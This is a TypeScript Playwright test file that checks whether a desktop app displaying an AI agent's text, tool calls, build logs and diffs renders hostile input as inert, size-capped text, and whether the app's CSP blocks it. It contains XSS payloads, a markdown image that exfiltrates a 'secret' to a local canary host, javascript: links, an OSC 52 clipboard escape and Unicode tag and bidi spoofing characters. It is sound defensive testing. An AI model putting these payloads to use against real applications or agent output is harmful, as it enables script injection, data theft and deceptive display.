// THREAT_MODEL P6a: adversarial payloads in agent text, tool input/target, build log, diff -> zero script
// execution, zero canary requests, capped text. bypassCSP so the text-node rendering is what is tested.
// [+] the same payload through innerHTML in the same page executes and hits the canary.
import { expect, MockBackend, PORTS, test } from "../../../apps/desktop/testkit/pw";
import { injectDevSession, waitOpen } from "./helpers";

const CANARY = `http://127.0.0.1:${PORTS.canary}`;
const TAG_A = String.fromCodePoint(0xe0041);
const PAYLOADS = [
  "<script>window.__pwned=1</script>",
  `<img src=x onerror="window.__pwned=1;fetch('${CANARY}/onerror')">`,
  `![exfil](${CANARY}/markdown.png?d=secret)`,
  "[open](javascript:window.__pwned=1)",
  "javascript:window.__pwned=1",
  "\u001b]52;c;cHduZWQ=\u0007after-osc52",
  `tag${TAG_A}chars`,
  "‮txt.exe",
];
// the client rejects frames above 64 KiB (backend payload cap is 8 KiB); 40 KiB still gets text-capped
const BIG = "B".repeat(40 * 1024);
const OVERSIZE = "B".repeat(10 * 1024 * 1024);

let be: MockBackend;
test.beforeEach(async () => {
  be = new MockBackend();
  await be.start();
});
test.afterEach(async () => {
  await be.stop();
});

test.describe("P6a", () => {
  test.use({ bypassCSP: true });

  test("payloads render as inert, capped text", async ({ page }) => {
    const pageRequests: string[] = [];
    page.on("request", (r) => pageRequests.push(r.url()));
    await injectDevSession(page);
    await page.goto("/");
    await waitOpen(page);
    const baselineScripts = await page.evaluate(() => document.scripts.length);

    be.push({ kind: "run.started", payload: { title: PAYLOADS[0] } });
    for (const p of PAYLOADS) {
      be.push(
        { kind: "plan.proposed", payload: { planId: "p1", title: p, steps: [p] } },
        { kind: "step.started", payload: { title: p } },
        { kind: "tool.call", payload: { callId: `c${be.lastSeq()}`, tool: p, target: p, input: p } },
        { kind: "agent.text", payload: { text: p } },
        { kind: "build.log", payload: { line: p } },
        { kind: "file.diff", payload: { path: "src/App.tsx", diff: `+${p}\n-${p}` } },
      );
    }
    be.push({ kind: "agent.text", payload: { text: BIG } }, { kind: "build.log", payload: { line: BIG } });
    be.pushRaw(JSON.stringify({ seq: be.lastSeq() + 1, prev: be.lastSeq(), kind: "agent.text", payload: { text: OVERSIZE } }));
    be.push({ kind: "step.started", payload: { title: "END-MARKER" } });
    be.push({ kind: "tool.call", payload: { callId: "c-esc", tool: "code_write_file", target: PAYLOADS[5], input: PAYLOADS[5] } });
    await expect(page.getByText("END-MARKER")).toBeVisible();
    await page.getByTestId("build-log").getByRole("button").first().click(); // expand the log too
    await page.waitForTimeout(800);

    const dom = await page.evaluate(() => {
      const w = window as unknown as { __pwned?: number };
      const all = [...document.querySelectorAll("#root *")];
      let maxText = 0;
      const walker = document.createTreeWalker(document.getElementById("root")!, NodeFilter.SHOW_TEXT);
      while (walker.nextNode()) maxText = Math.max(maxText, walker.currentNode.nodeValue?.length ?? 0);
      const text = document.getElementById("root")!.textContent ?? "";
      return {
        pwned: w.__pwned ?? null,
        scripts: document.scripts.length,
        active: document.querySelectorAll("#root img, #root a, #root script, #root object, #root embed").length,
        onAttrs: all.filter((e) => e.getAttributeNames().some((a) => a.startsWith("on"))).length,
        maxText,
        hasEsc: text.includes(String.fromCharCode(27)) || text.includes(String.fromCharCode(7)),
        // tool target/input show the raw code points as visible escapes
        escapedShown: text.includes(String.fromCharCode(92) + "x1b]52;"),
        hasTag: [...text].some((c) => (c.codePointAt(0) ?? 0) >= 0xe0000 && (c.codePointAt(0) ?? 0) <= 0xe007f),
        hasBidi: /[‪-‮⁦-⁩]/.test(text),
        literal: text.includes("<script>window.__pwned=1</script>"),
        clipped: text.includes("…[truncated]"),
      };
    });
    expect(dom.pwned).toBeNull();
    expect(dom.scripts).toBe(baselineScripts);
    expect(dom.active).toBe(0);
    expect(dom.onAttrs).toBe(0);
    expect(dom.hasEsc).toBe(false);
    expect(dom.escapedShown).toBe(true);
    expect(dom.hasTag).toBe(false);
    expect(dom.hasBidi).toBe(false);
    expect(dom.literal).toBe(true); // markup visible as characters
    expect(dom.clipped).toBe(true);
    expect(dom.maxText).toBeLessThanOrEqual(16_100);
    expect(be.canaryHits).toEqual([]);
    expect(pageRequests.filter((u) => u.includes(`:${PORTS.canary}`) || u.startsWith("javascript:"))).toEqual([]);

    // positive control: same page, same payload, innerHTML instead of text nodes
    await page.evaluate((html) => {
      const d = document.createElement("div");
      document.body.append(d);
      d.innerHTML = html;
    }, `<img src="${CANARY}/control.png" onerror="window.__pwned=1">`);
    await expect.poll(() => be.canaryHits.length).toBeGreaterThan(0);
    await expect.poll(() => page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned ?? null)).toBe(1);
  });
});

test("CSP from tauri.conf.json is served and also blocks the innerHTML control", async ({ page }) => {
  const resp = await page.goto("/");
  const csp = resp?.headers()["content-security-policy"] ?? "";
  expect(csp).toContain("script-src 'self'");
  expect(csp).toContain(`connect-src ipc: http://ipc.localhost http://127.0.0.1:${PORTS.api} ws://127.0.0.1:${PORTS.api};`);
  expect(csp).toContain(`frame-src http://*.localhost:${PORTS.preview};`);
  expect(csp).toContain("img-src 'self' data: blob:;");
  const violations: string[] = [];
  await page.exposeFunction("__violation", (d: string) => violations.push(d));
  await page.evaluate((html) => {
    document.addEventListener("securitypolicyviolation", (e) =>
      (window as unknown as { __violation: (d: string) => void }).__violation(e.violatedDirective),
    );
    const d = document.createElement("div");
    document.body.append(d);
    d.innerHTML = html;
  }, `<img src="${CANARY}/csp.png" onerror="window.__pwned=1">`);
  await expect.poll(() => violations.length).toBeGreaterThan(0);
  expect(be.canaryHits).toEqual([]);
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned ?? null)).toBeNull();
});
